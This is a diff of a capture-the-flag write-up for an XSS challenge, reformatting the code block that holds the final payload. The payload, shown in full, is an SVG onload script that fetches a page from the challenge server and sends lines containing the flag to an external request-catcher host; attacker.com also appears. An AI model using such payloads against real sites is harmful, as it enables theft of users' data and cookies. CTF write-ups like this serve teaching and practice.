@@ -47,6 +47,8 @@ fetch(window.location.href.substring(0, 7) + "idek-hello.chal.idek.team:1337" + 
 - Then we check whether the string FLAG appears in the current line. If it does, it calls fetch with attacker.com/cookies?resp=
 
 Final payload to be sent to the bot:
-```http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=fetch(window.location.href.substring(0, 7)%2b"idek-hello.chal.idek.team:1337"%2bwindow.location.href.substring(5,6)%2b"info.php"%2bwindow.location.href.substring(5,6)%2b"index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7)%2b"mymockserver123456.free.beeceptor.com"%2bwindow.location.href.substring(5,6)%2b"cookies?resp="%2bline)}})})})>```
+```
+http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=fetch(window.location.href.substring(0, 7)%2b"idek-hello.chal.idek.team:1337"%2bwindow.location.href.substring(5,6)%2b"info.php"%2bwindow.location.href.substring(5,6)%2b"index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7)%2b"mymockserver123456.free.beeceptor.com"%2bwindow.location.href.substring(5,6)%2b"cookies?resp="%2bline)}})})})>
+```
 
 FLAG: idek{Ghazy_N3gm_Elbalad}
